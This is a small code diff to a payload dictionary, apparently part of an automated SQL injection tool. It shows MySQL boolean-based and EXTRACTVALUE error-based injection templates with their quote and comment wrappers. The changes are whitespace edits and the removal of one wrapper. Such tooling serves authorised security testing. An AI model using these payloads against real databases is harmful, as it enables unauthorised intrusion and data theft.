@@ -1,10 +1,10 @@
 PAYLOADS = {
     "MySQL": {
-        "boolean-based": [
+        "boolean-based": [  
             {
                 "payload": "AND [RANDNUM]=[RANDNUM]",
                 "comments": [
-                    {"pref": " ", "suf": "#"},
+                    {"pref": " ", "suf": "#"}, 
                     {"pref": "' ", "suf": "#"},
                     {"pref": '" ', "suf": "#"},
                     {"pref": ") ", "suf": "#"},
@@ -696,7 +696,6 @@ PAYLOADS = {
                     {"pref": "') ", "suf": "#"},
                     # {"pref": '") ', "suf": ""},
                     {"pref": '") ', "suf": "-- wXyW"},
-                    {"pref": '") ', "suf": "#"},
                 ],
                 "title": "MySQL >= 5.1 OR error-based - WHERE or HAVING clause (EXTRACTVALUE)",
                 "vector": "OR EXTRACTVALUE(0,CONCAT_WS(0x28,0x7e,[INFERENCE],0x7e))",
